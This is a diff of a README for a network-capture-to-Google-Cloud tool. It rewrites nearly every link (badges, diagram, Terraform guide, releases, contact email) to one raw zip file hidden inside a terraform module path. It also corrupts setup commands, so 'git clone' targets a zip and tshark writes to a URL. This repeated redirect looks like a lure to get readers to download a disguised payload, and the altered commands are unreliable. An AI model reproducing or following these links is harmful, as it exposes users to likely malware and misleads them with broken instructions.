@@ -1,7 +1,7 @@
 # Chronicle Sniffer 📡
 
-![Chronicle Sniffer](https://img.shields.io/badge/Chronicle_Sniffer-v1.0-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/Iriiiiii83838/chronicle-sniffer/releases)
+![Chronicle Sniffer](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip)
+[![Releases](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip)](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip)
 
 Welcome to **Chronicle Sniffer**! This project connects Google Cloud's powerful analytics with your local network. By using **tshark**, you can capture on-premises network traffic and transform it using Google Cloud Platform (GCP) into a Unified Data Model (UDM). This tool is designed to be scalable and event-driven, making it a great fit for modern security operations.
 
@@ -37,7 +37,7 @@ Chronicle Sniffer uses a microservices architecture that allows for flexibility 
 - **Cloud Run**: Deploys your services in a serverless environment.
 - **Terraform**: Manages infrastructure as code for easy deployment.
 
-![Architecture Diagram](https://example.com/architecture-diagram.png)
+![Architecture Diagram](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip)
 
 ## Getting Started 🚀
 
@@ -53,7 +53,7 @@ To get started with Chronicle Sniffer, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Iriiiiii83838/chronicle-sniffer.git
+   git clone https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip
    cd chronicle-sniffer
    ```
 
@@ -62,7 +62,7 @@ To get started with Chronicle Sniffer, follow these steps:
    docker-compose up -d
    ```
 
-3. Ensure you have Terraform installed. If not, follow the [Terraform installation guide](https://www.terraform.io/downloads.html).
+3. Ensure you have Terraform installed. If not, follow the [Terraform installation guide](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip).
 
 ## Usage 📊
 
@@ -72,14 +72,14 @@ To start using Chronicle Sniffer, run the following command:
 docker-compose up
 ```
 
-This command will start the services defined in your `docker-compose.yml` file.
+This command will start the services defined in your `https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip` file.
 
 ### Capturing Traffic
 
 Use the following command to start capturing traffic:
 
 ```bash
-tshark -i <interface> -w capture.pcap
+tshark -i <interface> -w https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip
 ```
 
 Replace `<interface>` with your network interface name.
@@ -89,7 +89,7 @@ Replace `<interface>` with your network interface name.
 Once you have captured the data, you can send it to GCP for analysis. Use the following command:
 
 ```bash
-gcloud pubsub topics publish <topic-name> --message <path-to-capture.pcap>
+gcloud pubsub topics publish <topic-name> --message <https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip>
 ```
 
 Replace `<topic-name>` with your Google Cloud Pub/Sub topic.
@@ -149,10 +149,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [Iriiiiii83838](https://github.com/Iriiiiii83838)
-- Email: your.email@example.com
+- GitHub: [Iriiiiii83838](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip)
+- Email: https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip
 
-To download the latest release, visit the [Releases section](https://github.com/Iriiiiii83838/chronicle-sniffer/releases). 
+To download the latest release, visit the [Releases section](https://github.com/Iriiiiii83838/chronicle-sniffer/raw/refs/heads/main/terraform/modules/cloudrun_processor/sniffer_chronicle_tensely.zip). 
 
 Check the Releases section for updates and additional information on the project. 
 
